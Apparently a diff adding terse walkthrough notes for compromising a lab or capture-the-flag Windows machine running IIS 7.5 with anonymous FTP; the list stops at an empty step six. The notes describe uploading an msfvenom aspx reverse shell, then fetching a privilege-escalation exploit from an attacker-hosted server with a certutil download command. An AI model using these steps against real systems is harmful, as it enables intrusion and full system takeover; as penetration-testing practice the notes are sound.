@@ -1,0 +1,24 @@
+Step 1 (Scanning)
+- machine has been scanned using Nmap
+- machine has been reverted and re-scanned
+
+Step 2 (Enumeration)
+- target has anonymous ftp enabled and web server which reads files in the ftp client
+- the iis version is 7.5 meaning its from ~2008 build meaning aspx will likely run
+
+Step 3 (Foot hold)
+- make aspx reverse shell using msfvenom and upload to ftp server
+- access shell from browser to execute
+
+Step 4 (Enumeration)
+- 'systeminfo' shows us the OS build
+- searching for priviledge escalaition based on OS we find:
+- https://www.exploit-db.com/exploits/40564
+- compile according to script notes.
+- run 'python -m SimpleHTTPServer 80' to host file in http format.
+
+Step 5 (Priviledge escalation)
+- upload compild file using 'certutil -urlcache -f http://<ip>:<port>/<file>'.
+- run script for system level access.
+
+Step 6 (Host enumeration)
